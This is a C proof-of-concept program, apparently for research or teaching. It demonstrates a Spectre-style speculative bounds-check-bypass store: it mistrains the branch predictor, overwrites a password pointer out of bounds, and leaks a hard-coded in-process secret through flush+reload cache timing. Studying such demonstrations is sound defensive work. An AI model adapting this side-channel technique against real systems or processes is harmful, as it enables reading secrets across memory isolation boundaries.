#include <stdio.h>
#include <stdlib.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 3
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 9
#define N_TRAINING 10
#define BUF_SIZE 16
#define SECRET "mysecret"

typedef struct vars {
    char BUF[BUF_SIZE];
    char* PASSWORD;
} vars_t;
vars_t stack;

int buf_size __attribute__ ((aligned (256))) = BUF_SIZE;

/*
 * Variables required in cache:
 *  user_id
 *  user_char
 *  user_password
 *  BUF
 *  PASSWORD
 *  SECRET
 *
 * Variables required in mem:
 *  buf_size
 */
void check_passwd(int user_id, char user_char, char user_password, cp_t* flush_reload_arr, int secret_index) {

    stack.PASSWORD = "x";

    cpuid();
    flush(&buf_size);
    cpuid();

    //bounds check should prevent overwrite. But speculatively executes
    if (user_id < buf_size) {
        stack.BUF[user_id] = user_char;
    }

    //PASSWORD has been (speculatively) overwritten with user_char.
    if (user_password == stack.PASSWORD[0]) {
        volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
    }
}

int* prepare(int secret_index) {

    cp_t* flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr(flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses =   N_TRAINING + 1;
    int user_ids      [n_accesses];
    char user_chars   [n_accesses];
    char user_pwds    [n_accesses];

    for(int i = 0; i < n_accesses; i++) {
        user_ids[i]             = i % BUF_SIZE;
        user_pwds[i]            = 'x';
        user_chars[i]           = 'a' + (i%26);
    }

    //set up parameters for attack function call.
    user_ids   [n_accesses - 1] = BUF_SIZE;
    user_pwds  [n_accesses - 1] = 's';
    user_chars [n_accesses - 1] = 's';
    cpuid();

    //Misstrain branch predictor, last iteration is out-of-bounds attack function call
    for(int i = 0; i < n_accesses; i++) {
        check_passwd(user_ids[i], user_chars[i], user_pwds[i], flush_reload_arr, secret_index);
        cpuid();

        //flush hits from training phase (all but last access)
        if(i < n_accesses-1) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    //make sure previous loop finishes execution
    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    printf("buf      = %p\tbuf[last] = %p\npassword = %p\toverwrite = %p\n",
           &stack.BUF, &stack.BUF[BUF_SIZE-1], &stack.PASSWORD, &stack.BUF[BUF_SIZE]);

    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);

    return 0;
}